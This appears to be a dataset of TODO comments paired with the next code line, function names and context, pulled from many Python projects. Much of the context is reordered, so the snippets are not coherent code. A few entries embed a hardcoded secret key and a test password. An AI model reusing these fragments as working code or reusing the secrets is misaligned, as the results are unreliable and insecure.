# todo: move this scopes conversion from and to string into a utils function </s> scopes = form.cleaned_data.get('scopes')	form_valid 'state': form.cleaned_data.get('state', None), } if scopes: scopes = scopes.split(" ")
# todo: need to fix this test </s> return	test_arg_max def test_arg_max(self): for axis in [0, 1]: node_def = helper.make_node("ArgMax", ["data"], ["reduced"],
#todo fix cache </s> image.close()	_download_custom_emoticon image.write(msn_object._data.getvalue())
# todo: configurable timeout??? </s> syndic_dict['dead_until'] = time.time() + 60	_fire_master except SaltClientError: log.error('Unable to fire event to {0}, trying another...'.format(master)) log.critical('Unable to fire event on ANY master')
# xxx todo </s> return address, size	input_address_range size    = None
# todo: handle errors in future </s> self.body = timeline(self, future.result())	statuses_loaded_initial def statuses_loaded_initial(self, future): urwid.connect_signal(self.body, "status_focused", lambda _, args: self.status_focused(*args))
# todo test </s> return [self[key] for key in self.keys_without_aliases()]	values def values(self):
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
# todo(luotao): use clone() method to flush the program.desc in force, </s> return program.clone()	transpile self._adjust_input() self._remove_unused_var()
# todo not implemented yet </s> return	move_current_view_to_far_left Currently only supports 2 row or 2 column layouts. if self.window.num_groups() > 2: if self.window.num_groups() < 2: return
# todo: add ratio and percentage </s> out['diff'] = diff	metrics_df c1, c2 = out.columns diff = out[c2] - out[c1] styled = out.style.applymap(color_neg_and_pos, subset=['diff']) else:
# todo support intloguniformdistribution </s> else:	_initialize_x0 log_low = math.log(distribution.low) x0[name] = math.exp(np.mean([log_high, log_low])) raise NotImplementedError( "The distribution {} is not implemented.".format(distribution)
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo use the faster method </s> prj.flush_cache(false)	handle_project def handle_project(self, prj, **options): prj.get_stats() prj.get_mtime()
# todo add options to modify the columns </s> matrix.append([endpoint.machine.name, endpoint.state,	do_show if vlan.startswith('VLAN'): vlan.split('VLAN')[1] endpoint.endpoint_data['mac'], endpoint.endpoint_data['segment'],
# todo: fix </s> pass	parse_plist self._device.printer.debug('Extracting content from: {}'.format(plist_copy)) if sanitize: cmd = 'cat {}'.format(plist_copy) out = self.command_blocking(cmd, internal=True)
pass  # todo </s> def have_reached_end(self):	have_reached_end
# todo: other types than can have series inside: list, set, etc. </s> return typ	if_series_to_array_type if isinstance(typ, (types.Tuple, types.UniTuple)): return types.Tuple(list(map(if_series_to_array_type, typ.types)))
# todo(rbharath): how does distance need to be modified here to </s> if np.linalg.norm(coords[atom] - coords[neighbor_atom]) < self.neighbor_cutoff:	_featurize if neighbor_atom == atom: continue neighbor_list[atom].add(neighbor_atom) all_nbrs.add(neighbor_atom)
# todo this closure is ugly. it also doesn't work with </s> module = self._parser.module()	get_completions def get_completions(user_stmt, bs): names, level, only_modules = helpers.check_error_statements(module, self._pos) completions = []
# todo: remove this </s> warnings.warn(	__contains__ :param position: (x, y, z) :return: True if the position is inside the box otherwise False f"__contains__ is going to be removed\n{''.join(traceback.format_stack())}", DeprecationWarning,
# todo: leaf label is broken </s> leaf = leaf(i=i, d=depth, u=branch, x=x[i, :], n=n[i])	_mktree else: i = np.asscalar(np.flatnonzero(S1)) branch.l = leaf if I is not None:
return runtime.strarray(strs)  # todo: reuse this object too? </s> if name == 'bash_lineno':	GetVar path, _ = self.arena.GetDebugInfo(span.line_id) strs.append(path) strs = [] for func_name, source_name, call_spid, _, _ in reversed(self.debug_stack):
pass # todo </s> def handle_request(self, input):	handle_request
# todo: handle poster </s> glib.idle_add(self.play, media_id)	replace_media_overlays if any(overlay.autoplay for overlay in self._media_overlays[media_id]):
# todo: what decorator should we put here? in scipy.fftpack there is no planning, </s> def test_fftn_plan(self, xp, scp, dtype):	test_fftn_plan @testing.for_complex_dtypes() x = testing.shaped_random(self.shape, xp, dtype) x_orig = x.copy()
# todo: find another method to test this behavior without patching. </s> with patch(	test_warning_on_invalid_timestamp {'ETag': '"c8afdb36c52cf4727836669019e69222"'} ] 'awscli.customizations.s3.filegenerator.get_file_stat', return_value=(None, None)
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.cpp", int i = 1;
# todo sk: select standby db if necessary </s> shard_map = plproxy_config.get_django_shard_map()	_get_doc_database_map consider using `corehq.sql_db.get_db_alias_for_partitioned_doc` instead""" databases = {} part_mask = len(shard_map) - 1 for chunk in chunked(doc_ids, 100):
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo: add type and value checkings </s> assert self._i_hs_ref is not none, 'call compute_homographies'	warp def warp(self, inv_depth_ref, roi=None): if roi == None: roi = (0, self.height, 0, self.width)
# todo _why_? the user already logged in </s> b.fill_in("login", "user-el@example.org", wait=true)	test_remember_signup_locale b.assert_element('button[type="submit"]', text="Register") b.click_link("Sign in") b.fill_in("password", "?P455W0rd!") b.click_button("Sign In")
# todo replace with collections.sequence subclass </s> spotify.error.maybe_raise(self.error)	playlists image URI for matching playlists. Will always return :class:`None` if the search isn't loaded. if not self.is_loaded: return None
#todo implement transformation for corner nodes </s> if 'quad8' in vecname:	data_in_material_coord new_vector.data[:, :, 6] = Qx_new new_vector.data[:, :, 7] = Qy_new for i in [1, 2, 3, 4]: new_vector.data[:, i, :] = 0
fp = open("%s.py" % name, "w")   #todo confirm file overwrite </s> print >>fp, pipe2py.compile.parse_and_write_pipe(pipe_def, pipe_name=name, verbose=true)	setUp name = "pipe_2de0e4517ed76082dcddf66f7b218057" pipe_def = self._get_pipe_def("%s.json" % name)
# todo: check if scheme can be 'http' for http/2 ? </s> _request[":scheme"] = "https"	request _request[":method"] = _request.method _request[":authority"] = url.netloc _request[":path"] = url.path stream = self._new_stream(_request.headers)
pass # todo </s> def handle_request(self, input):	handle_request
# todo could keep_trailing_newline fix this better? </s> f.write(b'\n')	run with open(output, 'wb') as f: f.write(rendered.encode('utf-8')) else: parsed = parse_xml(state, file)
# todo: timeout should be removed when the engine is fixed so that it never hangs. -saul </s> self._reactor_thread.join(15.0)	stop if prev_state != 'starting': self._shutdown_subsystems()
pass # todo </s> def enddtd(self):	endDTD
# todo: allow to specify arguments </s> args_odict = _parse_args_from_manifest(manifest, 'change_url', auth=auth)	app_change_url app_checkurl(auth, '%s%s' % (domain, path), app) manifest = json.load(open(os.path.join(APPS_SETTING_PATH, app, "manifest.json"))) args_list = args_odict.values() args_list.append(app)
+ ansi.ansi_normal  # todo: why does it keep it? </s> + "foo"))	test_re_blinking parser.re_blinking( "a " + ansi.ANSI_BLINK + "red"
# todo(kurts): extract all this pinject-decorated fn stuff to a </s> if hasattr(fn, _is_decorator_attr):	_get_injection_kwargs def _get_injection_kwargs(self, fn, binding_key_stack): kwargs = {} arg_names, unused_varargs, unused_keywords, unused_defaults = ( inspect.getargspec(getattr(fn, _ORIG_FN_ATTR)))
# todo: migrate to where-in subqueries? </s> statements = ['''	update_output_states def update_output_states(self): UPDATE history_dataset_collection_association SET update_time = :update_time
rm.fetch(refspec=refspec, progress=progress)  # todo: progress +kwargs </s> else:	fetch with rm.repo.git.custom_environment( GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): rm.fetch(refspec=refspec, progress=progress)  # TODO: progress +kwargs
# todo: do this resampling in the pipeline? </s> slave_chunk = slave_chunk.resample(period_alias)	diff_between_two_meters chunksize=1E9) slave_chunk = next(slave_generator) master_chunk = master_chunk.resample(period_alias) diff = (master_chunk.icol(0) - slave_chunk.icol(0)).dropna()
# todo cache? </s> def test_disappearing():	test_disappearing saves = get_events(all_=True) favs = [s.kind for s in saves if s.text == 'favorited']
# todo: fix this </s> duration_step = time.time() - start_time_step	main tf_writer.add_histogram( name + '/grad', var2np(param.grad.clone()), step + 1) print("Step %d (epoch: %.3f): loss = %.3f/%.3f (%.3f/%.3f) / lr = %.5f (%.3f min)" % (step + 1, train_data.epoch_detail,
# todo: make sure this has test coverage </s> formset = subscriptionformset(request.post, queryset=qs)	newsletter_list newsletter__in=newsletters, user=request.user) if request.method == 'POST': if formset.is_valid(): formset.save()
# todo: kkrampa, shouldn't we wait to save the checkpoint until after we've processed all the data? </s> save_stock_data_checkpoint(checkpoint,	sync_stock_transaction date__gte=date, order_by='date'))) 'stock_transaction', meta.get('limit') or limit,
except exception:  # todo: what could happen here? </s> pass	send_status_ping if response['shutdown']: os._exit(6) except Exception as e: log('error', e)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_seed_wrong_type def test_fail_seed_wrong_type(self): ``seed`` is not a TrytesCompatible value.
# todo uncomment when gr-10346 will be fixed </s> self.assertraises(valueerror, math.log, -1.5)	testLog self.ftest('log(10**40, 10)', math.log(10**40, 10), 40) self.ftest('log(10**40, 10**20)', math.log(10**40, 10**20), 2) self.assertRaises(ValueError, math.log, -10**1000) self.assertRaises(ValueError, math.log, NINF)
# todo remove when below works </s> authorel = subelement(modelconf, 'author')	exportSdf SubElement(modelconf, 'version').text = 'DUMMY' SubElement(modelconf, 'sdf', version=sdfversion).text = modelname + '.sdf' SubElement(authorEL, 'name').text = "DUMMY" SubElement(authorEL, 'email').text = "dummy@dummy.mail"
# todo: kerberos login </s> smb_connection.login(self._user, self._password, self._domain,	get_gpttmpl file_name = '\\'.join(gpttmpl_path_split[4:]) smb_connection = SMBConnection(remoteName=target, remoteHost=target) self._lmhash, self._nthash) smb_connection.connectTree(share)
# todo: should we enable auto-retry, </s> producer.publish(msg, exchange=exchange)	do_publish elif exchange is not None: maybe_declare(exchange, channel)
# todo: use domain and port </s> client = mongoclient('localhost', settings.db_port)	migrate_uuid def migrate_uuid(self, save=True): db = client.sharejs db['ops.{}'.format(self.share_uuid.replace('-', '%2D'))].drop()
# todo: requires same key or none key </s> raise notimplementederror	EdgeStorage raise NotImplementedError def is_undirected(self) -> bool: def is_directed(self) -> bool: return not self.is_undirected
# todo: this is horrible </s> if len(setting) == 0 or setting[0] == '#':	__load_floorc fd.close() for setting in default_settings: continue try:
# todo: remember to delete </s> return_outputs(f'alert: {alert_id}, ts: {ts}', outputs={})	fetch_incidents alert_id = alert.get('id') ts = alert.get('timestamp') incident = alert_to_incident(alert) incidents.append(incident)
raise exception('not valid monitor')  # todo: custom exception </s> return super(monitorsuite, self).addtest(monitor)	add_monitor elif isinstance(monitor, (MonitorBase, MonitorSuite)):
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study()	test_plot_intermediate_values trial.report(2.0, step=1) return 0.0 study.optimize(lambda t: objective(t, True), n_trials=1) figure = plot_intermediate_values(study)
# todo is the processor the correct place to set this? </s> keras.backend.set_image_dim_ordering('th')	__init__ super(SevenPlaneFileProcessor, self).__init__(data_directory=data_directory, num_planes=num_planes, consolidate=consolidate)
# todo: do something more than simply selecting the last match? </s> hash_ = self.hash_schema(schema)	_get_constructor def _get_constructor(self, schema): matches = self.class_dict[hash_] return matches[-1] if matches else self._passthrough
# todo(b/142683826): beam type check error in </s> def validate_metrics(	validate_metrics sliced_metrics: Tuple[slicer.SliceKeyType, Dict['metric_types.MetricKey', Any]],
# todo: the contents of <question_text> element used to be broken in </s> "boolean_question", id=self.id_ + "_question")	to_ocil boolean_question = ET.Element(
# todo: loop or recurse here since a select may have multiple </s> select_info = queries.get(wildcard.table)	analyze_result_columns return None wildcard = wildcards[0] if not select_info: return LintResult(anchor=queries[None].select_statement)
# todo: define specific exception types (instead of general type) </s> raise exception("machineaction with key %s was already added. actions must have unique keys.", action.getkey())	addMachineAction self._machine_action[action.getKey()] = action else:
# todo - remove the -word_size argument as per blast+ 2.2.30 </s> self.parameters = [	NcbirpsblastCommandline subprocess module, as described in the Biopython tutorial. def __init__(self, cmd="rpsblast", **kwargs): _Option(["-seg", "seg"], Format: "yes", "window locut hicut", or "no" to disable.
'inception_v4'  : [testmodels.cntkemit, testmodels.coremlemit, testmodels.kerasemit, testmodels.pytorchemit, testmodels.tensorflowemit], # todo testmodels.mxnetemit(small error), testmodels.caffeemit(crash for shape) </s> 'resnet152'     : [testmodels.caffeemit, testmodels.cntkemit, testmodels.coremlemit, testmodels.kerasemit, testmodels.mxnetemit, testmodels.pytorchemit, testmodels.tensorflowemit],	get_test_table 'alexnet'       : [TestModels.CaffeEmit, TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.MXNetEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit], # TODO: TestModels.KerasEmit('Tensor' object has no attribute '_keras_history') 'inception_v1'  : [TestModels.CaffeEmit, TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.KerasEmit, TestModels.MXNetEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit], 'squeezenet'    : [TestModels.CaffeEmit, TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.KerasEmit, TestModels.MXNetEmit, TestModels.PytorchEmit, TestModels.TensorflowEmit], 'voc-fcn32s'    : [TestModels.CntkEmit, TestModels.CoreMLEmit, TestModels.TensorflowEmit],
# todo: perform this part concurrently. </s> value = self.server.get_now(ursula_interface_id)	follow_treasure_map continue if using_dht: header, signature, ursula_pubkey_sig, _hrac, ( port, interface, ttl) = dht_value_splitter(value, msgpack_remainder=True)
#todo trap and ignore attributeerror here? </s> else:	pipe_itembuilder if "subkey" in dv:  #todo: use this subkey check anywhere we can embed a module value = reduce(lambda i,k:i.get(k), [item] + dv['subkey'].split('.')) #forces an exception if any part is not found value = dv['value'] except KeyError:
# todo: support for multiple message versions </s> def handle_url(self, url, kexwords):	Job self.extractor.category, msg[1] ) def handle_directory(self, keywords): def handle_queue(self, url):
# todo: don't mess with the user's cursor. </s> sel = view.sel()	on_phantom_navigate def on_phantom_navigate(view, href, point): sel.clear() sel.add(sublime.Region(point, point))
# todo eh. traverse all of filesystem?? or only specific dirs for now? </s> return isdir(dotgit)	is_git_repo dotgit = join(d, '.git')
# todo: try mlp rather than bilinear </s> self.logits_edge_real = tf.reshape(bilinear_multi(emb_first_real, emb_second_real, out_dim=ob['adj'].get_shape()[1]),	_init pd_edge = CategoricalPdType(-1).pdfromflat(self.logits_edge) ac_edge = pd_edge.sample() [-1, ob['adj'].get_shape()[1]]) print('ob_adj', ob['adj'].get_shape(),
# todo some of these types could be filled in better </s> self.assertisinstance(one_row_complex.c.boolean.type, types.boolean)	test_reflect_select except ImportError: from sqlalchemy.databases.mysql import MSBigInteger as BigInteger self.assertIsInstance(one_row_complex.c.tinyint.type, types.Integer) self.assertIsInstance(one_row_complex.c.smallint.type, types.Integer)
# todo remove .as_posix when requiring python 3.6 </s> for f in os.listdir(dir_name.as_posix()):	_read_cell_data dir_name = pathlib.Path(filename).resolve().parent basename = os.path.splitext(os.path.basename(filename))[0] out = re.match("{}_([^\\.]+)\\.xml".format(basename), f) if not out:
# todo: need to replace the five "get" functions </s> def get_ip_mask():	get_ip_mask pass
# todo: remove when migration plan / state is passed (#24100). </s> loader = migrationloader(connection)	is_latest_migration_applied def is_latest_migration_applied(app_label): loader.load_disk() leaf_nodes = loader.graph.leaf_nodes(app=app_label)
# todo torches, redstone torches, crops, ladders, stairs, </s> if blockid == 66: # minetrack:	generate_special_texture def generate_special_texture(blockID, data): raw_straight = terrain_images[128] raw_corner = terrain_images[112]
# todo: allow numerical indices, and "+" for append </s> namespace = meta	replace_fields try: field, regex, subst, _ = pattern.split(pattern[-1]) keypath = [i.replace('\0', '.') for i in field.replace('..', '\0').split('.')] for key in keypath[:-1]:
# todo: universal? </s> self.frame_buffer = [0x00] * (self.width * self.height // 8)	__init__ width=300, height=400)
# todo xxx graalvm change </s> raise unittest.skiptest("not supported")	test_sni_callback_raising @needs_sni def test_sni_callback_raising(self): server_context, other_context, client_context = self.sni_contexts() def cb_raising(ssl_sock, server_name, initial_context):
# todo maybe not here but in an own function? </s> if 'quantity' in col_guess.lower():	__init__ if col_guess in file_manager.REQUIRED_HEADERS: field_name = col_guess.lower() + '-' + str(row['index']) self.fields[field_name] = forms.CharField( required=False,
# todo: refactor </s> tk.messagebox.showerror("internal error. use ctrl+c to copy",	_init_commands self.bind_all("<"+sequence+">", lambda e, cmd=item: cmd.execute(e), "+") except: traceback.format_exc()) if item.cmd_id == "step":
# todo: send alert </s> blacklist_whitelist_notification.delay(4) # notice_type = 4 whitelist	chk_prefix_in_whitelist break if flag: return True return False
# todo: are we following this in the spec? </s> tag = r"""	_compile_template_re def _compile_template_re(delimiters): tag_types = "!>&/#^" (?P<content>[\s\S]*?) (?P<whitespace>[\ \t]*)
# todo test </s> def apply_actual_cut(cut, connectivity_matrix):	apply_actual_cut set of nodes to the other are destroyed.""" if cut is None:
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
# todo: no-op component? </s> stage_op = none	define_api_methods_single initial_internal_states = self_.call(staging_area.unstage)  # preprocessed_last_s_prime else: state_values_pi, logits_pi, probs_pi, log_probabilities_pi, current_internal_states = \ self_.call(policy.get_state_values_logits_parameters_log_probs, preprocessed_s_all,
# todo this is a bit jankey to be honest </s> if apps_changed:	activate_integration_app settings.INSTALLED_APPS += [plugin_path] apps_changed = True apps.app_configs = OrderedDict() apps.apps_ready = apps.models_ready = apps.loading = apps.ready = False
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# '-rs',  # @todo: manually remove dependencies of conflicting packages, </s> '-r',	cli_install_packages 'sudo', 'pacman', '--noconfirm', ] + packages_to_be_removed,
# todo: raise something more specific or catch earlier </s> raise exception	_make_report_filter filter["type"] = "numeric" else: return filter
# todo: logging </s> return redirect(self.get_success_url())	post self.profile_form.save() messages.success(request, _('Your changes have been saved.')) messages.error(self.request, _('Oh :( We had trouble saving your input. See below for details.')) return super().get(request, *args, **kwargs)
#todo - handle start/end coordinates properly. short term hack for now: </s> record._al_start = int(query_annotation["al_start"])	next record.name = "match" record.annotations["original_length"] = int(match_annotation["sq_len"]) record._al_stop = int(query_annotation["al_stop"]) if alphabet == single_letter_alphabet and "sq_type" in match_annotation :
# todo: remove in 1.2 release </s> run_deprecated_edit_bird_hook(request, items)	for_frontend AddPageItem(Page.objects.get(id=page_id)), ] for fn in hooks.get_hooks('construct_wagtail_userbar'): fn(request, items)
#    # todo(soren): this is what the compute manager does when you </s> for vm_not_found_in_db in vms_not_found_in_db:	_poll_instance_states db_instance['id'], vm_state) name = vm_not_found_in_db LOG.warning(_("Found VM not in DB: '%(name)s'.  Ignoring")
# todo lookup tracks in batch for better performance </s> dirs_and_futures.append(context.core.library.lookup(ref.uri))	listallinfo browse_futures.append(context.core.library.browse(ref.uri)) elif ref.type == Ref.TRACK: result = [] for obj in dirs_and_futures:
# todo: if needed allow other handling (like adding values) </s> np.maximum(filt.filter, filt_pos, out=filt_pos)	multi_filterbank stop = min(start + len(filt.filter), num_fft_bins) filt_pos = bank[start:stop, band_id] if norm: bank /= bank.sum(0)
# todo: this self.size enforces a 2**64 limit to array size </s> linear_loc = self.linear_loc()	reshape if sh == shape: return value max_shape = max(shape) if len(shape) != 0 else 1 coords = np.empty((len(shape), self.nnz), dtype=np.min_scalar_type(max_shape - 1))
""" todo: documentation </s> return false	streaming @property def streaming(self):
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo don't know how to get return value </s> return 0xd10c	hook_SendMessageA }) def hook_SendMessageA(ql, address, params):
# todo: verify/modify these lists </s> version_changing_attrs = ["xpath", "type", "name"]	testChildAttributes child = self._get_basic_elementdef() filled = self._get_basic_formdef(child_elements = [child]) nonversion_changing_attrs = [ "short_name", "min_occurs", "tag"] for attr in version_changing_attrs:
#todo - fix the trailing space! </s> self.assertequal(str(cline).rstrip(), "muscle -in fasta/f002 -maxiters 2 -stable")	SimpleAlignTest cline.set_parameter("stable") cline.set_parameter("maxiters", 2) result, out_handle, err_handle = generic_run(cline) print err_handle.read()
annot.annotation_metadata.validation_and_reliability = "todo"  # todo </s> annot.annotation_metadata.origin = "centre for digital music"	fill_annoatation_metadata annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.annotation_rules = "TODO"  # TODO annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO"  # TODO
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: require tests </s> return true	hessian_is_zero def hessian_is_zero(self):
#todo implement qgis2.0 variant </s> pass	setRasterStyle myTransparencyList) else: theQgsRasterLayer.saveDefaultStyle() return myRangeList, myTransparencyList
# todo: use triple factory </s> batch_size = 16	test_hole model = HolE(triples_factory=self.factory, embedding_dim=8) self.assertIsNotNone(model) triples = torch.zeros(batch_size, 3, dtype=torch.long) scores = model.forward_owa(triples)
(timestamp - relativedelta(days=(90 if histogram_type == 'active_cases' else 30))).isoformat(),  # todo - add to configs </s> timestamp.isoformat(),	_histo_data_non_cumulative [domain_name_data], histogram_type, filters )
# todo treat boundary conditions </s> nb_dofs[ghost_nbrs] = self.boundary_val	get_nbrhd_dofs nb_normals = self.get_cell_nn_per_facet(region, neighbours) ghost_nbrs = nm.where(neighbours < 0) if dim == 1:  # periodic boundary conditions in 1D neighbours[0, 0] = -1
# todo: exclude tests which fail to import: e.g. on windows </s> exec 'import mvpa.tests.' + t	collect_test_suites tests = collect_unit_tests(verbosity=verbosity) for t in tests: return dict([(t[5:], eval('mvpa.tests.' + t + '.suite()')) for t in tests ])
# todo; to include configurablereportkafkapillow features </s> return constructedpillow(	get_ucr_es_form_pillow checkpoint_callback=ucr_processor ) name=pillow_id, topics=topics.FORM_TOPICS,
# todo: validate grant </s> db = connect()	grant_add CLI Example:: salt '*' mysql.grant_add 'SELECT|INSERT|UPDATE|...' 'database.*' 'frank' 'localhost' cur = db.cursor() query = __grant_generate(grant, database, user, host)
# todo(nnorwitz): need to ignore friend method declarations. </s> condition = lambda node: isinstance(node, ast.function)	main def main(argv): ast.PrintAllIndentifiers(argv[1:], condition)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_inputs_implicit def test_pass_inputs_implicit(self): Preparing a bundle that finds inputs to use automatically.
# todo(adu): delete when it will no longer be used </s> peers = event.data.get('peers') or list()	process event.reqid, 'meta2', peer, container_url, container_id) elif event.event_type == EventTypes.CONTAINER_DELETED: for peer in peers: self._service_delete(
# todo: should not we see here actual texts in log too? </s> assert "conditionnotmatchederror: condition not matched" in error.value.msg	test_have_no_texts_exception assert "has no texts ('Alex', 'Yakov')" in error.value.msg
# todo: add hook to be called after each song </s> except exception:	MusicBot entries_added = await player.playlist.async_process_youtube_playlist( playlist_url, channel=channel, author=author) traceback.print_exc() raise exceptions.CommandError('Error handling playlist %s queuing.' % playlist_url, expire_in=30)
# todo(shardy): may be able to remove when the bug above is fixed </s> nova = client.client(username=con.username,	authenticate if con.password is not None: try: api_key=con.password, project_id=con.tenant,
# todo: get fee </s> self.asserttrue(any([isinstance(event, sellordercreatedevent) and event.order_id == order_id	test_buy_and_sell self.assertAlmostEqual(base_amount_traded, order_completed_event.base_asset_amount) self.assertAlmostEqual(quote_amount_traded, order_completed_event.quote_asset_amount) for event in self.event_logger.event_log])) expected_base_bal = base_bal
print('warning: failed to resolve {}'.format(ep.name))  # todo: use proper logger </s> return none	safe_load driver_init = ep.resolve() except: try: driver = driver_init()
# todo: check that the birth date is not in the future </s> return number	validate raise InvalidLength() birth_date = get_birth_date(number)
# todo:  urlencode file names in the url while adding/decode upon retrieval </s> def _init_cache(self):	_init_cache self._cache_dir = tempfile.mkdtemp(dir=opj('.git', 'datalad', 'tmp')) self.debug("Cleaning up the cache")
pass # todo </s> def endentity(self, name):	endEntity
# todo expression </s> f.write(u"todo expression")	print_imspec def print_imspec(f, imspec): if imspec[1] is not None: # Expression else: # Image name f.write(' '.join(imspec[0]))
# todo: differentiate between tags assigned to the instance and a m2m field for tags (ex: configcontext) </s> elif key == 'tags':	model_to_dict if key.startswith('_'): del model_dict[key] model_dict[key] = ','.join(sorted([tag.name for tag in model_dict['tags']])) elif model_dict[key] and type(model_dict[key]) in (list, tuple) and hasattr(model_dict[key][0], 'pk'):
# todo: implement this in c. </s> def __init__(self, gen):	__init__ self.__wrapped = gen self.__isgen = gen.__class__ is GeneratorType
# todo xxx no memory lock implemented </s> assert arg2.is_op('preinc')	ldxr def ldxr(ir, instr, arg1, arg2): assert len(arg2.args) == 1 ptr = arg2.args[0]
# todo: verify this is always none. e.g. run with runtime input input </s> v = none	__search wildcard_value = None if v == {'__class__': 'RuntimeValue'}: elif k == 'chromInfo' and '?.len' in v: continue
# todo: all filtered scanlines start with a byte indicating the filter </s> assert list(out) == [30, 31, 32, 230, 231, 232]	test_filter_scanline_first_line assert list(out) == [1, 30, 31, 32, 200, 200, 200] out = png.filter_scanline(2, line, fo, None)  # up out = png.filter_scanline(3, line, fo, None)  # average assert list(out) == [3, 30, 31, 32, 215, 216, 216]
# todo: localize </s> self.speak(	wrapper handler(message) except: "An error occurred while processing a request in " + self.name)
# todo: actually implement feature importance visualization for multiclass problems. </s> if isinstance(shap_values, list):	train explainer = shap.TreeExplainer(self.clf) shap_values = explainer.shap_values(X_train) shap_values = np.sum(np.abs(shap_values), axis=0) important_features = self.get_important_features(importance_cutoff, shap_values)
#todo: am i supposed to be adding the namespace like this? </s> data_node.append(etree.element(ns+tag))	handle ns = "{%s}" % data_node.nsmap[None] tag = hidden_value_path.replace("/data/", "") ns = "{%s}" % xform_root.nsmap[None] itext_node = xform_root[0][1].find(ns+"itext")
# todo: this should be method on bound object </s> return self._state.get(instance, self._init)	get_toggleaction_state def get_toggleaction_state(self, instance):
# todo: remove when 36lts is discontinued </s> if not hasattr(self, "variant_ids"):	__iter__ if self.root is None: return self.variant_ids = self._get_variant_ids() for vid, variant in itertools.izip(self.variant_ids, self.variants):
pass  # todo </s> def save(self, playlist):	save
## todo: fix the unicode issue mentioned in </s> if sys.version_info[:2] <= (2, 7):  ## python2	pronunciation if json_obj: Refer : http://stackoverflow.com/questions/18337407/saving-utf-8-texts-in-json-dumps-as-utf8-not-as-u-escape-sequence return Response().respond(json_obj, format) else:   ## python3
#todo - introduce an annotated alignment class? </s> alignment._annotations = parsed_bundle[0]	_build_alignment def _build_alignment(self, parsed_bundle): alignment = MultipleSeqAlignment([], self.alphabet) for idn in parsed_bundle[2]: species_data = parsed_bundle[1][idn]
# todo: generalize </s> in_arrs, _ = guard(find_build_sequence, self.func_ir, args[0])	_run_call_np return self._run_call_np_dot(lhs, assign, args) if func_name == 'stack' and self._is_1D_arr(lhs): arr0 = in_arrs[0].name self._array_starts[lhs] = [self._array_starts[arr0][0], None]
# todo: raise error in 0.9 or 0.10. </s> return	__init__ if crs is not None and data.crs != crs: _crs_mismatch_warning() if geometry is None and "geometry" in self.columns: if (self.columns == "geometry").sum() > 1:
step = 0.1  # todo </s> jd = arange(jd0, jd1, step)	find_all raise ValueError('your start_time {} is later than your end_time {}' .format(start_time, end_time)) end_mask = linspace(0.0, 1.0, num) start_mask = end_mask[::-1]
#todo: make more general (if possible) </s> solar_date = self.solar_date(record_dict)	solar_year_month Function which takes a record_dict containing all values from a query in the get_db_slices function and returns a (year, month) tuple from the solar date of the observation return (solar_date.year, solar_date.month)
# todo should be resp.raise_from_status </s> raise pepperexception('authentication denied')	req_requests resp = requests.post(**params) if resp.status_code == 401: if resp.status_code == 500: raise PepperException('Server error.')
# todo: take care of theano to keras port: </s> ))	vgg16 net["conv_3_pool"], 3, "conv_4", 512, activation=activation, net.update(base.conv_pool( net["conv_4_pool"], 3, "conv_5", 512,
""" todo(datapipe-1525): this fixture override the </s> `mock_source_cursor` fixture present in conftest.py	mock_source_cursor @pytest.yield_fixture def mock_source_cursor(self): mock_cursor = mock.Mock() mock_cursor.fetchone.return_value = ('mysql-bin.000003', 1133)
# todo check the actual transformation matrix. </s> print("------icp")	testICP self.assertTrue(converged is True) self.assertLess(fitness, .1) print "Converged: ", converged, "Estimate: ", estimate, "Fitness ", fitness print "Rotation: "
# todo: create a validate for class name </s> name = self.field_name_resolvers[modeltype.class].get_valid_name(name)	default_class_name_generator def default_class_name_generator(self, name: str) -> str: return snake_to_upper_camel(name)
# todo implement this method </s> :return:	send_event :param event: the event to be sent
# todo: remove compatability hook </s> shutil.copyfile(os.path.join(self.freeze_dir,esky_control_dir,"lockfile.txt"),os.path.join(self.freeze_dir,"esky-lockfile.txt"))	_run with open(lockfile,"w") as lf: lf.write("this file is used by esky to lock the version dir\n") shutil.copyfile(os.path.join(self.freeze_dir,ESKY_CONTROL_DIR,"bootstrap-manifest.txt"),os.path.join(self.freeze_dir,"esky-bootstrap.txt")) print "zipping up the esky"
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
raise pathaccesserror()  # todo: path </s> elif self.operation == '[':	_eval raise PathAccessError()  # TODO: path if ret is _MISSING: try: ret = target[arg]
# todo since </s> bottoms.append(	render if command_info.get('arguments'): command_args = [arg['name'] for arg in command_info['arguments']] ("class:bottom-toolbar.on", f"({comamnd_group}) {self.command_holder.command} {command_args}") )
min_stake=0,  # todo: where to get this? </s> federated_only=self.federated_only,	load_seednodes for uri in canonical_sage_uris: sage_node = Ursula.from_teacher_uri(teacher_uri=uri, network_middleware=self.network_middleware, registry=self.registry)
